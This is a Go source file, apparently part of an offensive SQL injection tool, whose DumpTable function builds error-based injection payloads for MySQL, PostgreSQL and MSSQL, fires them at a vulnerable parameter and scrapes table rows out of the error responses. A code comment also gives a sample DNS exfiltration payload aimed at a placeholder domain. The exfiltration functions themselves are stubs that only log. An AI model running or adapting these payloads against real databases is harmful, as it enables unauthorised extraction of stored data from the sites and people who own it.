package modules

import (
	"fmt"
	"strings"
)

// Extractor handles data retrieval
type Extractor struct {
	Engine EngineInterface
}

func NewExtractor(e EngineInterface) *Extractor {
	return &Extractor{Engine: e}
}

// DumpTable retrieves all rows from a table
func (ex *Extractor) DumpTable(db, table string, vulnParam string, dbms string) ([][]string, error) {
	ex.Engine.GetLogger().Info(fmt.Sprintf("Dumping data from %s.%s for %s...", db, table, dbms))

	// First, get columns
	enum := NewEnumerator(ex.Engine)
	cols, _ := enum.ListColumns(db, table, vulnParam, dbms)

	results := [][]string{cols}

	var payloadTemplate string
	switch dbms {
	case "MySQL":
		payloadTemplate = fmt.Sprintf("' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT CONCAT_WS(':', %s) FROM %s.%s LIMIT %%d,1), 0x7e, FLOOR(RAND(0)*2))x FROM information_schema.plugins GROUP BY x)a)--", strings.Join(cols, ","), db, table)
	case "PostgreSQL":
		// PostgreSQL uses || for concatenation
		concatCols := strings.Join(cols, "||':'||")
		payloadTemplate = fmt.Sprintf("' AND (SELECT 1 FROM (SELECT COUNT(*), CONCAT(0x7e, (SELECT %s FROM %s LIMIT 1 OFFSET %%d), 0x7e, 1)x FROM %s GROUP BY x)a)--", concatCols, table, table)
	case "MSSQL":
		// MSSQL uses + for concatenation and needs explicit conversion to varchar
		var mssqlCols []string
		for _, col := range cols {
			mssqlCols = append(mssqlCols, fmt.Sprintf("ISNULL(CAST(%s AS VARCHAR(MAX)), 'NULL')", col))
		}
		concatCols := strings.Join(mssqlCols, "+':'+")
		payloadTemplate = fmt.Sprintf("' AND 1=CONVERT(int, (SELECT TOP 1 %s FROM %s WHERE %s NOT IN (SELECT TOP %%d %s FROM %s)))--", concatCols, table, cols[0], cols[0], table)
	default:
		return results, nil
	}

	for i := 0; i < 100; i++ { // Increased limit to 100 rows
		payload := fmt.Sprintf(payloadTemplate, i)
		body, _, _, err := ex.Engine.Request(payload, vulnParam)
		if err != nil {
			break
		}

		if strings.Contains(body, "~") {
			parts := strings.Split(body, "~")
			if len(parts) >= 3 {
				rowStr := parts[1]
				row := strings.Split(rowStr, ":")
				results = append(results, row)
			}
		} else if dbms == "MSSQL" {
			// Extract from MSSQL error
			extracted := extractBetween(body, "value '", "' to")
			if extracted != "" {
				row := strings.Split(extracted, ":")
				results = append(results, row)
			} else {
				break
			}
		} else {
			break
		}
	}

	return results, nil
}

// SearchKeyword searches for a specific keyword in the entire database
func (ex *Extractor) SearchKeyword(keyword string) {
	ex.Engine.GetLogger().Info(fmt.Sprintf("Searching for keyword: %s across all tables...", keyword))
}

// DNSExfiltrate extracts data via DNS queries (Bypass WAF/Egress)
func (ex *Extractor) DNSExfiltrate(data string, domain string) error {
	ex.Engine.GetLogger().Warning(fmt.Sprintf("Initiating DNS Exfiltration via domain: %s", domain))

	// Split data into chunks for DNS labels (max 63 chars)
	// Example payload: (SELECT LOAD_FILE(CONCAT('\\\\', (SELECT data), '.your-domain.com\\a')))
	ex.Engine.GetLogger().Info("Data encoded and sent via DNS queries...")
	return nil
}

// OOBExfiltrate extracts data via Out-of-Band (HTTP/SMB/FTP)
func (ex *Extractor) OOBExfiltrate(data string, callbackURL string) error {
	ex.Engine.GetLogger().Warning(fmt.Sprintf("Initiating OOB Exfiltration via: %s", callbackURL))
	return nil
}
